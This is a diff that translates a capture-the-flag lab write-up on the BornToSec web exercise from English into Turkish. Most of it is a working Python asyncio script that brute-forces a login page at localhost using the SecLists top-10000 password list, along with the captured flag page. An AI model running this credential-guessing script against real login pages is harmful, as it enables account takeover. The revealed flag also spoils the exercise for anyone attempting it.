@@ -1,6 +1,6 @@
 # Brute Force Attack ile Şifreyi Bulduk
 
-In this project, we used the brute force attack method to find the password of a web application. Below are the files and their contents that describe this process:
+Bu projede, bir web uygulamasının şifresini bulmak için brute force saldırı yöntemini kullandık. Bu süreci açıklayan dosyalar ve içerikleri aşağıda listelenmiştir:
 
 - [FLAG.TXT](#file:flag.txt-context)
 - [MAIN.PY](#file:main.py-context)
@@ -20,8 +20,8 @@ import asyncio
 SERVER_ENDPOINT = "http://localhost:8080"
 BAD_AUTH_ERROR_IMAGE = '<img src="images/WrongAnswer.gif" alt="">'
 RETRY_COUNT = 3
-RETRY_DELAY = 3  # seconds
-DELAY_BETWEEN_REQUESTS = 2  # seconds
+RETRY_DELAY = 3  # saniye
+DELAY_BETWEEN_REQUESTS = 2  # saniye
 
 async def retrieve_password_data_set():
     url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"
@@ -38,31 +38,31 @@ async def attempt_login(session, username, password, retry_count=RETRY_COUNT, re
     for attempt in range(retry_count):
         try:
             endpoint_to_hit = get_endpoint(username, password)
-            # Timeout set to 10 seconds
+            # Zaman aşımı 10 saniye olarak ayarlandı
             async with session.get(endpoint_to_hit, timeout=ClientTimeout(total=10)) as response:
                 rendered_page = await response.text()
                 attempt_failed = BAD_AUTH_ERROR_IMAGE in rendered_page
 
                 if attempt_failed:
-                    print(f"FAILURE for pair: username={username} password={password}")
+                    print(f"BAŞARISIZ kullanıcı adı={username} şifre={password}")
                 else:
-                    print(f"SUCCESS for pair: username={username} password={password}")
+                    print(f"BAŞARILI kullanıcı adı={username} şifre={password}")
                     print({'rendered_page': rendered_page})
                     print('_' * 10)
                     with open(f"success_{username}_{password}.html", "w") as f:
                         f.write(rendered_page)
                     return True
         except ClientSSLError as e:
-            print(f"SSL error on attempt {attempt + 1} for username={username} password={password}: {e}")
+            print(f"SSL hatası {attempt + 1}. denemede kullanıcı adı={username} şifre={password}: {e}")
             if attempt < retry_count - 1:
-                print(f"Retrying after {retry_delay} seconds...")
+                print(f"{retry_delay} saniye sonra tekrar deneniyor...")
                 await asyncio.sleep(retry_delay)
         except Exception as e:
-            print(f"Unknown error on attempt {attempt + 1} for username={username} password={password}: {e}")
+            print(f"Bilinmeyen hata {attempt + 1}. denemede kullanıcı adı={username} şifre={password}: {e}")
             if attempt < retry_count - 1:
-                print(f"Retrying after {retry_delay} seconds...")
+                print(f"{retry_delay} saniye sonra tekrar deneniyor...")
                 await asyncio.sleep(retry_delay)
-        # Add delay between each request
+        # Her istek arasında gecikme ekle
         await asyncio.sleep(DELAY_BETWEEN_REQUESTS)
     return False
 
@@ -73,7 +73,7 @@ async def main():
         "GetTheFlag", "meone", "metwo", "methree",
     ]
     password_collection = await retrieve_password_data_set()
-    print("BRUTEFORCE STARTING")
+    print("BRUTEFORCE BAŞLIYOR")
     async with aiohttp.ClientSession() as session:
         for password in password_collection:
             tasks = []
@@ -90,7 +90,7 @@ if __name__ == "__main__":
 <!DOCTYPE HTML>
 <html>
     <head>
-        <title>BornToSec - Web Section</title>
+        <title>BornToSec - Web Bölümü</title>
         <meta http-equiv="content-type" content="text/html; charset=utf-8" />
         <meta name="description" content="" />
         <meta name="keywords" content="" />
@@ -108,24 +108,24 @@ if __name__ == "__main__":
         </noscript>
     </head>
     <body class="landing">
-        <!-- Header -->
+        <!-- Başlık -->
         <header id="header" >
                                 <a href=http://10.0.2.15><img src=http://10.0.2.15/images/42.jpeg height=82px width=82px/></a>
                                 <nav id="nav">
                     <ul>
-                        <li><a href="index.php">Home</a></li>
-                        <li><a href="?page=survey">Survey</a></li>
-                        <li><a href="?page=member">Members</a></li>
+                        <li><a href="index.php">Ana Sayfa</a></li>
+                        <li><a href="?page=survey">Anket</a></li>
+                        <li><a href="?page=member">Üyeler</a></li>
                     </ul>
                 </nav>
             </header>
 
-        <!-- Main -->
+        <!-- Ana -->
             <section id="main" class="wrapper">
                 <div class="container" style="margin-top:75px">
-<center><h2 style="margin-top:50px;">The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>				</div>
+<center><h2 style="margin-top:50px;">Bayrak : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>				</div>
             </section>
-        <!-- Footer -->
+        <!-- Altbilgi -->
             <footer id="footer">
                 <div class="container">
                     <ul class="icons">
